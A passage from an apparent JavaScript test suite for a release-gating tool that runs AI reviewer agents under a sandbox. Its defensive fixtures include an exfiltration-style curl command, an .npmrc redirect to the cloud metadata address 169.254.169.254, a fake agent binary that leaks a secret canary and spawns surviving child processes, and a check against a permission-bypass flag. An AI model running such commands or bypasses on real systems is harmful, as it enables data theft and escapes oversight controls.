      else process.env.RELEASE_QUALITY_OUTER_SANDBOX_ATTESTED = original;
      return;
    }
    const hostHome = userInfo().homedir;
    const script = `const fs=require('node:fs');if(!fs.existsSync('package.json'))process.exit(2);try{fs.readdirSync(${JSON.stringify(hostHome)});process.exit(3)}catch{}try{fs.readdirSync(${JSON.stringify(TEST_DIR)});process.exit(4)}catch{}`;
    const wrapped = wrapCandidateCommand(process.execPath, ['-e', script], {
      allowedRoots: [PROJECT_ROOT], hostHome,
    });
    const result = spawnSync(wrapped.command, wrapped.args, { cwd: PROJECT_ROOT, encoding: 'utf8' });
    assertEqual(result.status, 0, result.stderr);

    const isolated = join(TEST_DIR, 'nested-write-root');
    mkdirSync(isolated, { recursive: true });
    const protectedTarget = join(PROJECT_ROOT, 'quality-reports', `.nested-write-${randomUUID()}`);
    const childScript = `require('node:fs').writeFileSync(${JSON.stringify(protectedTarget)},'forged')`;
    const nestedScript = `const{spawnSync}=require('node:child_process');const r=spawnSync(process.execPath,['-e',${JSON.stringify(childScript)}]);process.exit(r.status===0?5:0)`;
    const outer = wrapCandidateCommand(process.execPath, ['-e', nestedScript], {
      readOnlyRoots: [PROJECT_ROOT], writeRoots: [isolated], hostHome,
    });
    const nested = spawnSync(outer.command, outer.args, { cwd: PROJECT_ROOT, encoding: 'utf8' });
    assertEqual(nested.status, 0, nested.stderr);
    assertEqual(existsSync(protectedTarget), false, 'Nested candidate must not write the real report root');
  });

  test('candidate evidence output is redacted before persistence', () => {
    const record = runEvidenceCommand('fixture', PROJECT_ROOT, () => 'token=abcdefghijklmnop');
    assertEqual(record.status, 'pass');
    assertEqual(containsSensitiveText(record.output), false);
    assertTrue(record.output.includes('[REDACTED]'), 'Expected redacted evidence output');
  });

  test('candidate config cannot substitute the network-enabled audit command', () => {
    const candidateCommands = [];
    let trustedAuditRuns = 0;
    const record = command => ({
      command, status: 'pass', exit_code: 0, output: 'passed', output_bytes: 6, truncated: false,
      started_at: new Date().toISOString(), finished_at: new Date().toISOString(),
    });
    const checks = runAutomatedChecks(
      { verification: {
        test: 'npm test', typecheck: 'npm run typecheck', build: 'npm run build', lint: 'npm run lint',
        coverage: 'npm run coverage', e2e: 'npm run test:e2e', audit: 'curl https://example.invalid/exfiltrate',
      } },
      PROJECT_ROOT,
      PROJECT_ROOT,
      command => { candidateCommands.push(command); return record(command); },
      () => { trustedAuditRuns++; return record('npm audit --audit-level=high'); },
    );
    assertEqual(candidateCommands.includes('curl https://example.invalid/exfiltrate'), false);
    assertEqual(trustedAuditRuns, 1);
    assertEqual(checks.auditGate.command, 'npm audit --audit-level=high');
  });

  test('trusted audit workspace excludes candidate npm configuration', () => {
    const candidate = join(TEST_DIR, 'audit-candidate');
    const isolatedHome = join(TEST_DIR, 'audit-home');
    mkdirSync(candidate, { recursive: true });
    mkdirSync(isolatedHome, { recursive: true });
    writeFileSync(join(candidate, 'package.json'), '{"name":"fixture","version":"1.0.0"}');
    writeFileSync(join(candidate, 'package-lock.json'), '{"name":"fixture","lockfileVersion":3,"packages":{}}');
    writeFileSync(join(candidate, '.npmrc'), 'registry=http://169.254.169.254/candidate-prefix/');
    const prepared = prepareTrustedAuditWorkspace(candidate, isolatedHome);
    assertEqual(existsSync(join(prepared.auditRoot, '.npmrc')), false);
    assertEqual(readFileSync(prepared.userConfig, 'utf8'), '');
    assertEqual(readFileSync(prepared.globalConfig, 'utf8'), '');
    assertEqual(existsSync(join(prepared.auditRoot, 'package-lock.json')), true);
  });

  test('rejects a repository output parent symlinked outside the repository', async () => {
    const link = join(TEST_DIR, 'outside-link');
    symlinkSync('/tmp', link, 'dir');
    let rejected = false;
    try {
      await writeContainedFile(PROJECT_ROOT, join(link, 'must-not-write.txt'), 'blocked');
    } catch {
      rejected = true;
    }
    assertEqual(rejected, true);
  });

  test('writes contained files through production filesystem guards', async () => {
    const root = join(TEST_DIR, 'contained-files');
    mkdirSync(root, { recursive: true });
    const syncFile = join(root, 'sync', 'record.txt');
    writeContainedFileSync(root, syncFile, 'one');
    assertEqual(readContainedFileSync(root, syncFile), 'one');
    writeContainedFileSync(root, syncFile, 'two');
    assertEqual(readContainedFileSync(root, syncFile), 'two');

    const asyncFile = join(root, 'async', 'record.txt');
    await writeContainedFile(root, asyncFile, 'async');
    assertEqual(readContainedFileSync(root, asyncFile), 'async');
  });
});

test.describe('fail-closed result parsing', () => {
  test('returns an empty result for missing YAML', () => {
    const parsed = parseYamlResult(null);
    assertEqual(parsed.reviewer, null);
    assertEqual(parsed.score, null);
    assertEqual(parsed.blockers.length, 0);
    assertEqual(parsed.redlines.length, 0);
  });

  test('parses inline blocker and redline arrays', () => {
    const parsed = parseYamlResult(`reviewer: destructive-qa\nscore: 100\nstatus: fail\nblockers: [P1]\nredlines: [P0]\n`);
    assertEqual(parsed.status, 'fail');
    assertEqual(parsed.blockers.length, 1);
    assertEqual(parsed.redlines.length, 1);
  });

  test('parses and retains packet profile and round identity', () => {
    const parsed = parseYamlResult(`reviewer: destructive-qa\nprofile: agentic-release-gate\nround: 5\ncandidate_commit: 1111111111111111111111111111111111111111\ncandidate_tree: 2222222222222222222222222222222222222222\nscore: 95\nstatus: pass\nblockers: []\nredlines: []\n`);
    assertEqual(parsed.profile, 'agentic-release-gate');
    assertEqual(parsed.round, 5);
    assertEqual(parsed.candidateCommit, '1111111111111111111111111111111111111111');
    assertEqual(parsed.candidateTree, '2222222222222222222222222222222222222222');
  });
});

test.describe('no-blocker parsing', () => {
  test('does not treat canonical empty P0/P1 sections as vetoes', () => {
    assertEqual(parseBlockers('# Blockers\n\n## P0\nNone.\n\n## P1\nNone.\n').length, 0);
  });

  test('accepts case-insensitive no-blocker sentences', () => {
    assertEqual(parseBlockers('No P0/P1 blockers.').length, 0);
    assertEqual(parseBlockers('NO P0 OR P1 BLOCKERS.').length, 0);
  });

  test('retains titled P0/P1 headings and ignores unrelated checklists', () => {
    for (const heading of ['## P0 — Hidden veto', '## P1 - Hidden veto', '## P0: Hidden veto', '## P1 (Hidden veto)']) {
      const parsed = parseBlockers(`${heading}\nEvidence: reproducible\n`);
      assertEqual(parsed.length, 1, `Expected titled severity heading to be retained: ${heading}`);
    }
    assertEqual(parseBlockers('- [ ] Overall score >= 90\n- [x] No P0/P1 blocker\n').length, 0);
  });
});

test.describe('conditional reviewer triggers', () => {
  test('triggers from diff content patterns when file globs do not match', () => {
    assertEqual(matchesTriggerConditions(
      ['README.md'],
      '+ const credential = input;',
      { files: ['**/auth/**'], patterns: ['credential'] }
    ), true);
  });

  test('anchors glob patterns to the full path', () => {
    assertEqual(matchesTriggerConditions(
      ['not-components/file.ts'],
      '',
      { files: ['**/components/**'], patterns: [] }
    ), false);
  });

  test('matches globstar directories at the repository root', () => {
    assertEqual(matchesTriggerConditions(
      ['scripts/sync-skills.mjs'],
      '',
      { files: ['**/scripts/**'], patterns: [] }
    ), true);
  });
});

test.describe('CLI fail-closed integration', () => {
  test('gate rejects a symlinked report root without writing outside the repository', () => {
    const sandbox = mkdtempSync(join(tmpdir(), 'quality-review-symlink-'));
    const clone = join(sandbox, 'repo');
    const external = join(sandbox, 'external');
    try {
      const cloned = spawnSync('git', ['clone', '--quiet', '--no-local', PROJECT_ROOT, clone], { encoding: 'utf8' });
      assertEqual(cloned.status, 0);
      copyFileSync(join(SKILL_DIR, 'scripts', 'review-gate.mjs'),
        join(clone, 'skills/release-quality-review/scripts/review-gate.mjs'));
      copyFileSync(join(SKILL_DIR, 'lib', 'security-utils.mjs'),
        join(clone, 'skills/release-quality-review/lib/security-utils.mjs'));
      copyFileSync(join(SKILL_DIR, 'lib', 'review-utils.mjs'),
        join(clone, 'skills/release-quality-review/lib/review-utils.mjs'));
      mkdirSync(external);
      rmSync(join(clone, 'quality-reports'), { recursive: true, force: true });
      symlinkSync(external, join(clone, 'quality-reports'), 'dir');
      const result = spawnSync('node', [
        join(clone, 'skills/release-quality-review/scripts/review-gate.mjs'),
        '--profile', 'quick', '--round', '991', '--no-collect', '--no-validate-evidence',
      ], { cwd: clone, encoding: 'utf8' });
      assertTrue(result.status !== 0, 'Expected symlinked report root to fail');
      assertEqual(existsSync(join(external, 'round-991', 'summary.md')), false,
        'Gate must not write reports through a symlinked report root');
    } finally {
      rmSync(sandbox, { recursive: true, force: true });
    }
  });

  test('gate does not invoke an unpinned network-resolved circular scanner', () => {
    const source = readFileSync(join(SKILL_DIR, 'scripts', 'review-gate.mjs'), 'utf8');
    assertEqual(/npx\s+madge/.test(source), false);
    assertEqual(/madge[^\n]*\|\|\s*echo/.test(source), false);
  });

  test('gate and runner keep candidate writes outside the real report root', () => {
    const runner = readFileSync(join(SKILL_DIR, 'scripts', 'review-runner.mjs'), 'utf8');
    assertEqual(runner.includes('writeRoots: [REPORT_DIR, ISOLATED_HOME]'), false, 'Runner exposes report root');
    assertEqual(runner.includes('createCandidateRuntime'), true, 'Runner bypasses shared candidate runtime');
    const evidence = readFileSync(join(SKILL_DIR, 'scripts', 'modules', 'evidence.mjs'), 'utf8');
    assertEqual(evidence.includes('createCandidateRuntime'), true, 'Gate evidence collection bypasses shared candidate runtime');
    assertEqual(evidence.includes('const candidateRoot = prepareCheckout()'), true, 'Gate evidence collection lacks isolated checkout');
    const runtime = readFileSync(join(SKILL_DIR, 'lib', 'candidate-runtime.mjs'), 'utf8');
    assertEqual(runtime.includes('sandboxWriteRoots = [isolatedHome]'), true, 'Shared runtime lacks isolated write root');
    assertEqual(runtime.includes('readOnlyRoots: [projectRoot, ...sandboxReadOnlyRoots]'), false,
      'Candidate runtime exposes the host project root to every command');
  });

  test('candidate runtime cannot read a real report canary', () => {
    if (process.platform !== 'darwin') return;
    const probe = spawnSync('/usr/bin/sandbox-exec', ['-p', '(version 1) (allow default)', '/usr/bin/true'], { encoding: 'utf8' });
    if (probe.status !== 0) return;
    const candidateRoot = join(TEST_DIR, `candidate-read-${randomUUID()}`);
    const canary = join(PROJECT_ROOT, 'quality-reports', `.read-canary-${randomUUID()}`);
    mkdirSync(candidateRoot, { recursive: true });
    writeFileSync(join(candidateRoot, 'allowed.txt'), 'allowed');
    writeFileSync(canary, 'trusted');
    const runtime = createCandidateRuntime(PROJECT_ROOT, 'read-boundary-test');
    try {
      const script = `const fs=require('node:fs');if(fs.readFileSync('allowed.txt','utf8')!=='allowed')process.exit(2);try{fs.readFileSync(${JSON.stringify(canary)});process.exit(3)}catch{}`;
      const output = runtime.execFileSync(process.execPath, ['-e', script], {
        cwd: candidateRoot, encoding: 'utf8', sandboxReadOnlyRoots: [candidateRoot],
      });
      assertEqual(output, '');
    } finally {
      rmSync(canary, { force: true });
    }
  });

  test('evidence collection rejects candidate checkout mutation', () => {
    const repository = join(TEST_DIR, `mutating-candidate-${randomUUID()}`);
    const cloned = spawnSync('git', ['clone', '--quiet', '--no-local', PROJECT_ROOT, repository], {
      cwd: TEST_DIR, encoding: 'utf8', timeout: 30000,
    });
    assertEqual(cloned.status, 0, `Expected fixture clone, output: ${cloned.stdout}${cloned.stderr}`);
    const manifestPath = join(repository, 'package.json');
    const manifest = JSON.parse(readFileSync(manifestPath, 'utf8'));
    const mutatingTest = 'env -u NODE_TEST_CONTEXT node --test mutating-candidate.test.mjs';
    for (const script of ['test', 'typecheck', 'build', 'lint', 'coverage', 'test:e2e']) {
      manifest.scripts[script] = mutatingTest;
    }
    writeFileSync(manifestPath, `${JSON.stringify(manifest, null, 2)}\n`);
    writeFileSync(join(repository, 'mutating-candidate.test.mjs'),
      "import { appendFileSync } from 'node:fs'; import test from 'node:test'; appendFileSync('README.md', '\\nmutation'); test('passes', () => {});\n");
    spawnSync('git', ['config', 'user.email', 'test@example.invalid'], { cwd: repository });
    spawnSync('git', ['config', 'user.name', 'Test'], { cwd: repository });
    spawnSync('git', ['add', 'package.json', 'mutating-candidate.test.mjs'], { cwd: repository });
    const committed = spawnSync('git', ['commit', '--quiet', '-m', 'mutating candidate'], {
      cwd: repository, encoding: 'utf8',
    });
    assertEqual(committed.status, 0, committed.stderr);
    const base = spawnSync('git', ['rev-parse', 'HEAD^'], { cwd: repository, encoding: 'utf8' }).stdout.trim();
    let rejected = false;
    let rejectionMessage = '';
    try {
      collectEvidence({ verification: {
        test: mutatingTest, typecheck: mutatingTest, build: mutatingTest, lint: mutatingTest,
        coverage: mutatingTest, e2e: mutatingTest,
      } }, repository, base, base, join(repository, 'skills', 'release-quality-review'));
    } catch (error) {
      rejectionMessage = error.message;
      rejected = /checkout identity changed|candidate filesystem sandbox unavailable/.test(error.message);
    }
    assertEqual(rejected, true, `Candidate checkout mutation must fail evidence collection; got: ${rejectionMessage}`);
  });

  test('Claude reviewer invocation accepts report edits without interactive approval', () => {
    const runner = readFileSync(join(SKILL_DIR, 'scripts', 'review-runner.mjs'), 'utf8');
    assertTrue(runner.includes("args: ['-p', '--permission-mode', 'acceptEdits', '--no-session-persistence', prompt]"),
      'Claude print mode must not block waiting for report write approval');
    assertEqual(runner.includes('--dangerously-skip-permissions'), false,
      'Claude reviewer must not bypass all permission checks');
  });

  test('reviewer prompt requires scalar score and exact machine verdict', () => {
    const runner = readFileSync(join(SKILL_DIR, 'scripts', 'review-runner.mjs'), 'utf8');
    assertTrue(runner.includes('score 必须是整数'), 'Prompt must reject object-shaped scores');
    assertTrue(runner.includes('status 必须是小写 pass 或 fail'), 'Prompt must require a parseable verdict');
    assertTrue(runner.includes('score: <0-100 integer>'));
    assertTrue(runner.includes('status: <pass|fail>'));
  });

  test('parallel review has no project concurrency cap or implicit start delay', () => {
    const runner = readFileSync(join(SKILL_DIR, 'scripts', 'review-runner.mjs'), 'utf8');
    const config = readFileSync(join(SKILL_DIR, 'review-config.yaml'), 'utf8');
    assertTrue(runner.includes("RELEASE_QUALITY_REVIEWER_START_DELAY_MS || '0'"));
    assertTrue(runner.includes('Promise.all(allReviewers.map'));
    assertEqual(config.includes('max_concurrent'), false);
  });

  test('validator CLIs reject unknown or incomplete options with configuration exit 4', () => {
    const cases = [
      ['goal-instruction-gate.mjs', ['--input', '/goal bounded result', '--definitely-invalid']],
      ['goal-mode-validator.mjs', ['--file', 'README.md', '--definitely-invalid']],
      ['validate-delivery-packet.mjs', ['--packet', '.', '--definitely-invalid']],
      ['goal-instruction-gate.mjs', ['--file']],
      ['goal-mode-validator.mjs', ['--round']],
      ['validate-delivery-packet.mjs', ['--mode']],
    ];
    for (const [script, args] of cases) {
      const result = spawnSync('node', [join(SKILL_DIR, 'scripts', script), ...args], {
        cwd: PROJECT_ROOT, encoding: 'utf8',
      });
      assertEqual(result.status, 4, `${script}: ${result.stdout}${result.stderr}`);
      assertTrue(result.stderr.includes('Configuration error:'));
      assertEqual(result.stderr.includes('\n    at '), false);
    }
  });

  test('validator CLI help and goal stdin paths are executable', () => {
    for (const script of [
      'goal-instruction-gate.mjs', 'goal-mode-validator.mjs', 'validate-delivery-packet.mjs',
    ]) {
      const help = spawnSync('node', [join(SKILL_DIR, 'scripts', script), '--help'], {
        cwd: PROJECT_ROOT, encoding: 'utf8',
      });
      assertEqual(help.status, 0, `${script}: ${help.stdout}${help.stderr}`);
      assertTrue(help.stdout.includes('Usage:'));
    }
    const stdin = spawnSync('node', [join(SKILL_DIR, 'scripts', 'goal-instruction-gate.mjs'), '--stdin'], {
      cwd: PROJECT_ROOT, encoding: 'utf8',
      input: '/goal release-quality-review 达到可发布状态。验证标准：测试、覆盖率与 Gate 均通过。边界：不降低门槛。证据：输出退出码与提交哈希。停止条件：达成即停止。',
    });
    assertEqual(stdin.status, 0, `${stdin.stdout}${stdin.stderr}`);
  });

  test('evidence CLIs redact invalid output paths and use configuration exit 4', () => {
    for (const [script, args] of [
      [join(PROJECT_ROOT, 'scripts', 'verify-clean-candidate.mjs'), ['--output', '../outside/clean-candidate.json']],
      [join(SKILL_DIR, 'scripts', 'verify-rollback.mjs'), ['--base', 'HEAD', '--output', '../outside/rollback-verification.json']],
    ]) {
      const result = spawnSync('node', [script, ...args], { cwd: PROJECT_ROOT, encoding: 'utf8' });
      assertEqual(result.status, 4, `${result.stdout}${result.stderr}`);
      assertEqual(result.stderr.includes('\n    at '), false);
      assertEqual(result.stderr.includes(PROJECT_ROOT), false);
    }
  });

  test('invalid diff and rollback base refs fail as configuration errors', () => {
    const missingRef = `missing-ref-${randomUUID()}`;
    const roundNumber = TEST_ROUNDS.runner + 400;
    const round = reportRound(roundNumber);
    mkdirSync(round, { recursive: true });
    const cases = [
      [join(SKILL_DIR, 'scripts', 'verify-rollback.mjs'), [
        '--base', missingRef, '--output', `quality-reports/round-${TEST_ROUNDS.runner}/evidence/rollback-verification.json`,
      ]],
      [join(SKILL_DIR, 'scripts', 'evidence-validator.mjs'), [
        '--round', `round-${roundNumber}`, '--reviewer', 'architecture-maintainer', '--base', missingRef,
      ]],
    ];
    try {
      for (const [script, args] of cases) {
        const result = spawnSync('node', [script, ...args], { cwd: PROJECT_ROOT, encoding: 'utf8' });
        assertEqual(result.status, 4, `${result.stdout}${result.stderr}`);
        assertEqual(result.stdout.includes('Diff files: 0'), false);
        assertEqual(result.stderr.includes('\n    at '), false);
        assertEqual(result.stderr.includes(PROJECT_ROOT), false);
      }
    } finally {
      rmSync(round, { recursive: true, force: true });
    }
  });

  test('changed validator CLIs cover success and failure boundaries', () => {
    const validGoal = join(TEST_DIR, 'valid-goal.md');
    const invalidGoal = join(TEST_DIR, 'invalid-goal.md');
    const validMode = join(TEST_DIR, 'valid-mode.md');
    const invalidMode = join(TEST_DIR, 'invalid-mode.md');
    writeFileSync(validGoal, '/goal release-quality-review 达到可发布状态。验证标准：测试、覆盖率与 Gate 均通过。边界：不降低门槛。证据：输出退出码与提交哈希。停止条件：达成即停止。');
    writeFileSync(invalidGoal, '/goal 首先修改代码，然后跳过测试，最后宣布完成。');
    writeFileSync(validMode, '发布状态已由独立证据确认。');
    writeFileSync(invalidMode, '先执行测试，然后发布。我们添加这段代码，并按照步骤逐步完成。');
    const run = (script, args) => spawnSync('node', [join(SKILL_DIR, 'scripts', script), ...args], {
      cwd: PROJECT_ROOT, encoding: 'utf8',
    });
    assertEqual(run('goal-instruction-gate.mjs', ['--file', validGoal]).status, 0);
    assertEqual(run('goal-instruction-gate.mjs', ['--file', invalidGoal]).status, 1);
    assertEqual(run('goal-mode-validator.mjs', ['--file', validMode]).status, 0);
    assertEqual(run('goal-mode-validator.mjs', ['--file', invalidMode]).status, 1);
    const missingPacket = join(TEST_DIR, 'missing-packet');
    assertEqual(run('validate-delivery-packet.mjs', ['--packet', missingPacket, '--mode', 'strict']).status, 1);
    assertEqual(run('validate-delivery-packet.mjs', ['--packet', missingPacket, '--mode', 'assisted']).status, 2);
    assertEqual(run('validate-delivery-packet.mjs', ['--packet', missingPacket, '--mode', 'legacy']).status, 3);
  });

  test('goal-mode round validation covers reviewer success and verbose failure', () => {
    const roundNumber = TEST_ROUNDS.runner + 300;
    const round = reportRound(roundNumber);
    const reviewer = join(round, 'product-flow');
    mkdirSync(reviewer, { recursive: true });
    writeFileSync(join(reviewer, 'score.md'), '发布状态已由独立证据确认。');
    writeFileSync(join(reviewer, 'blockers.md'), '未发现阻塞项。');
    writeFileSync(join(reviewer, 'improvement-list.md'), '后续改进项已明确记录。');
    const run = args => spawnSync('node', [
      join(SKILL_DIR, 'scripts', 'goal-mode-validator.mjs'), '--round', String(roundNumber), ...args,
    ], { cwd: PROJECT_ROOT, encoding: 'utf8' });
    try {
      assertEqual(run([]).status, 0);
      writeFileSync(join(reviewer, 'score.md'), '先执行测试，然后发布。我们添加这段代码，并按照步骤逐步完成。');
      const failed = run(['--verbose']);
      assertEqual(failed.status, 1, `${failed.stdout}${failed.stderr}`);
      assertTrue(failed.stdout.includes('Top Violation Types'));
    } finally {
      rmSync(round, { recursive: true, force: true });
    }
  });

  test('runner resolves the diff base with read-only project access', () => {
    const runner = readFileSync(join(SKILL_DIR, 'scripts', 'review-runner.mjs'), 'utf8');
    assertTrue(runner.includes('sandboxReadOnlyRoots: [PROJECT_ROOT]'));
  });

  test('release evidence exposes a coverage command and versioned changelog', () => {
    const manifest = JSON.parse(readFileSync(join(PROJECT_ROOT, 'package.json'), 'utf8'));
    assertTrue(typeof manifest.scripts?.coverage === 'string', 'Expected a coverage script');
    assertEqual(existsSync(join(PROJECT_ROOT, 'CHANGELOG.md')), true, 'Expected CHANGELOG.md');
  });

  test('documented agentic workflow binds clean evidence before collection on supported CI', () => {
    const readme = readFileSync(join(PROJECT_ROOT, 'README.md'), 'utf8');
    const clean = readme.indexOf('npm run skill:verify-clean');
    const rollback = readme.indexOf('npm run skill:verify-rollback');
    const runner = readme.indexOf('npm run review -- --profile agentic-release-gate');
    assertTrue(clean >= 0 && runner >= 0 && clean < runner, 'Clean evidence must precede the collecting runner');
    assertTrue(rollback >= 0 && rollback < runner, 'Rollback evidence must precede the collecting runner');
    assertTrue(readme.includes('test ! -e "quality-reports/$REVIEW_ROUND_DIR"'), 'Workflow must reject reused rounds');
    assertEqual(readme.includes('quality-reports/round-001'), false, 'Workflow must not target tracked Round 1');
    assertTrue(readme.includes('Trust boundary:'), 'README must state the local trust boundary');
    assertTrue(readme.includes('not signatures'), 'README must distinguish drift hashes from signatures');
    assertTrue(readme.includes('codex login status'), 'Quickstart must document Codex authentication preflight');
    assertTrue(readme.includes('claude auth status'), 'Quickstart must document Claude authentication preflight');
    assertTrue(readme.includes('--profile quick --round "$REVIEW_ROUND" --agent codex'),
      'First review must select a documented backend explicitly');
    assertTrue(readme.includes('automatically launches reviewer processes'),
      'Quickstart must disclose that review launches external Agent processes');
    const destructiveReviewer = readFileSync(join(SKILL_DIR, 'reviewers', 'destructive-qa.md'), 'utf8');
    assertTrue(destructiveReviewer.includes('威胁模型边界'), 'Destructive QA must evaluate the supported threat model');
    assertTrue(destructiveReviewer.includes('不能单独证明'), 'Synthetic helper inputs must not be reported as workflow bypasses');
    const gate = readFileSync(join(SKILL_DIR, 'scripts', 'review-gate.mjs'), 'utf8');
    assertTrue(gate.includes("if (existsSync(join(roundDir, 'generated-goal.md')))"),
      'Agentic Gate must validate its required generated Goal');
    assertTrue(gate.includes("requiredAgenticArtifacts.every"),
      'Agentic Gate must enforce the complete delivery packet');
    const workflow = readFileSync(join(PROJECT_ROOT, '.github', 'workflows', 'skill-quality.yml'), 'utf8');
    assertTrue(workflow.includes('runs-on: macos-latest'), 'Sandbox validation requires a Darwin CI runner');
    assertTrue(workflow.includes('persist-credentials: false'), 'CI checkout credentials must not persist');
  });

  test('parallel runner terminates hung reviewers and exits with agent failure', () => {
    const round = reportRound(TEST_ROUNDS.parallelTimeout);
    const fakeBin = join(TEST_DIR, 'fake-bin');
    const leakMarker = join(TEST_DIR, 'reviewer-descendant-leak');
    const canaryMarker = join(TEST_DIR, 'reviewer-env-canary-leak');
    try {
      mkdirSync(fakeBin);
      const fakeCodex = join(fakeBin, 'codex');
      const descendantCode = `process.on('SIGTERM', () => {}); setTimeout(() => require('node:fs').writeFileSync(${JSON.stringify(leakMarker)}, 'leaked'), 500)`;
      writeFileSync(fakeCodex, `#!/usr/bin/env node
if (process.env.AMBIENT_SECRET_CANARY) process.getBuiltinModule('node:fs').writeFileSync(${JSON.stringify(canaryMarker)}, 'leaked');
if (process.argv.includes('--version') || process.argv.includes('--help')) process.exit(0);
process.getBuiltinModule('node:child_process').spawn(process.execPath, ['-e',
  ${JSON.stringify(descendantCode)}
], { stdio: 'ignore', env: process.env }).unref();
setInterval(() => { if (process.ppid === 1) process.exit(0); }, 20);
`);
      chmodSync(fakeCodex, 0o755);
      const result = spawnSync('node', [
        join(SKILL_DIR, 'scripts', 'review-runner.mjs'), '--profile', 'quick', '--parallel',
        '--agent', 'codex', '--round', String(TEST_ROUNDS.parallelTimeout), '--skip-evidence',
      ], {
        cwd: PROJECT_ROOT,
        encoding: 'utf8',
        timeout: 3000,
        env: {
          ...process.env,
          PATH: `${fakeBin}:${process.env.PATH}`,
          RELEASE_QUALITY_REVIEWER_TIMEOUT_MS: '100',
          RELEASE_QUALITY_REVIEWER_KILL_GRACE_MS: '100',
          RELEASE_QUALITY_REVIEWER_START_DELAY_MS: '1',
          AMBIENT_SECRET_CANARY: 'ambient-secret-must-not-cross',
        },
      });
      assertEqual(result.status, 5, `Expected exit 5, output: ${result.stdout}${result.stderr}`);
      assertTrue(result.stdout.includes('timed out'), 'Expected explicit reviewer timeout diagnostic');
      spawnSync(process.execPath, ['-e', 'setTimeout(() => {}, 700)']);
      assertEqual(existsSync(leakMarker), false,
        `Reviewer descendants must not survive to perform delayed writes: ${result.stdout}${result.stderr}`);
      assertEqual(existsSync(canaryMarker), false, 'Reviewer subprocesses must not inherit ambient secrets');
    } finally {
      rmSync(round, { recursive: true, force: true });
    }
  });

  test('parallel runner cleans descendants after a successful reviewer exit', () => {
    const round = reportRound(TEST_ROUNDS.parallelSuccess);
    const fakeBin = join(TEST_DIR, 'fake-bin-success');
    const leakMarker = join(TEST_DIR, 'successful-reviewer-descendant-leak');
    try {
      mkdirSync(fakeBin);
      const fakeCodex = join(fakeBin, 'codex');
      const reviewerDir = join(round, 'product-flow');
      const candidateCommit = spawnSync('git', ['rev-parse', 'HEAD'], { cwd: PROJECT_ROOT, encoding: 'utf8' }).stdout.trim();
      const candidateTree = spawnSync('git', ['rev-parse', 'HEAD^{tree}'], { cwd: PROJECT_ROOT, encoding: 'utf8' }).stdout.trim();
      const descendantCode = `process.on('SIGTERM', () => {}); setTimeout(() => require('node:fs').writeFileSync(${JSON.stringify(leakMarker)}, 'survived'), 500)`;
      writeFileSync(fakeCodex, `#!/usr/bin/env node
if (process.argv.includes('--version') || process.argv.includes('--help')) process.exit(0);
const fs = process.getBuiltinModule('node:fs');
fs.mkdirSync(${JSON.stringify(reviewerDir)}, { recursive: true });
fs.writeFileSync(${JSON.stringify(join(reviewerDir, 'result.yaml'))}, 'reviewer: product-flow\\nprofile: quick\\nround: ${TEST_ROUNDS.parallelSuccess}\\ncandidate_commit: ${candidateCommit}\\ncandidate_tree: ${candidateTree}\\nscore: 95\\nstatus: pass\\nblockers: []\\nredlines: []\\n');
fs.writeFileSync(${JSON.stringify(join(reviewerDir, 'score.md'))}, '# Score\\n\\n## Overall Score: 95/100\\n');
fs.writeFileSync(${JSON.stringify(join(reviewerDir, 'blockers.md'))}, '# Blockers\\n\\nNo P0/P1 blockers.\\n');
fs.writeFileSync(${JSON.stringify(join(reviewerDir, 'improvement-list.md'))}, '# Improvements\\n');
process.getBuiltinModule('node:child_process').spawn(process.execPath, ['-e', ${JSON.stringify(descendantCode)}], { stdio: 'ignore', env: process.env }).unref();
`);
      chmodSync(fakeCodex, 0o755);
      const result = spawnSync('node', [
        join(SKILL_DIR, 'scripts', 'review-runner.mjs'), '--profile', 'quick', '--parallel', '--agent', 'codex',
        '--reviewer', 'product-flow', '--round', String(TEST_ROUNDS.parallelSuccess), '--skip-evidence',
      ], {
        cwd: PROJECT_ROOT, encoding: 'utf8', timeout: 5000,
        env: {
          ...process.env, PATH: `${fakeBin}:${process.env.PATH}`,
          RELEASE_QUALITY_REVIEWER_TIMEOUT_MS: '1000', RELEASE_QUALITY_REVIEWER_KILL_GRACE_MS: '100',
          RELEASE_QUALITY_REVIEWER_RETRY_MAX: '0', RELEASE_QUALITY_REVIEWER_START_DELAY_MS: '1',
        },
      });
      assertEqual(result.status, 1, `Expected failed gate after successful reviewer, output: ${result.stdout}${result.stderr}`);
      assertTrue(readFileSync(join(reviewerDir, 'score.md'), 'utf8').includes('95/100'),
        'Runner must preserve reviewer-authored artifacts');
      spawnSync(process.execPath, ['-e', 'setTimeout(() => {}, 700)']);
      assertEqual(existsSync(leakMarker), false, 'Successful reviewers must not leave descendants alive');
    } finally {
      rmSync(round, { recursive: true, force: true });
    }
  });

  test('sequential runner terminates hung reviewer descendants', () => {
    const roundNumber = TEST_ROUNDS.parallelSuccess + 100;
    const round = reportRound(roundNumber);
    const fakeBin = join(TEST_DIR, 'fake-bin-sequential-timeout');
    const leakMarker = join(TEST_DIR, 'sequential-reviewer-descendant-leak');
    try {
      mkdirSync(fakeBin);
      const fakeCodex = join(fakeBin, 'codex');
      const descendantCode = `process.on('SIGTERM', () => {}); setTimeout(() => require('node:fs').writeFileSync(${JSON.stringify(leakMarker)}, 'leaked'), 500)`;
      writeFileSync(fakeCodex, `#!/usr/bin/env node
process.getBuiltinModule('node:child_process').spawn(process.execPath, ['-e', ${JSON.stringify(descendantCode)}], { stdio: 'ignore', env: process.env });
setInterval(() => {}, 1000);
`);
      chmodSync(fakeCodex, 0o755);
      const result = spawnSync('node', [
        join(SKILL_DIR, 'scripts', 'review-runner.mjs'), '--profile', 'quick', '--agent', 'codex',
        '--reviewer', 'product-flow', '--round', String(roundNumber), '--skip-evidence',
      ], {
        cwd: PROJECT_ROOT,
        encoding: 'utf8',
        timeout: 3000,
        env: {
          ...process.env,
          PATH: `${fakeBin}:${process.env.PATH}`,
          RELEASE_QUALITY_REVIEWER_TIMEOUT_MS: '100',
          RELEASE_QUALITY_REVIEWER_KILL_GRACE_MS: '100',
          RELEASE_QUALITY_REVIEWER_RETRY_MAX: '0',
          RELEASE_QUALITY_REVIEWER_START_DELAY_MS: '1',
        },
      });
      assertEqual(result.status, 5, `Expected exit 5, output: ${result.stdout}${result.stderr}`);
      assertTrue(result.stdout.includes('timed out'), 'Expected explicit sequential timeout diagnostic');
      spawnSync(process.execPath, ['-e', 'setTimeout(() => {}, 700)']);
      assertEqual(existsSync(leakMarker), false, 'Sequential reviewer descendants must be terminated');
    } finally {
      rmSync(round, { recursive: true, force: true });
    }
  });

  test('sequential runner cleans descendants after a successful reviewer exit', () => {
    const roundNumber = TEST_ROUNDS.parallelSuccess + 101;
    const round = reportRound(roundNumber);
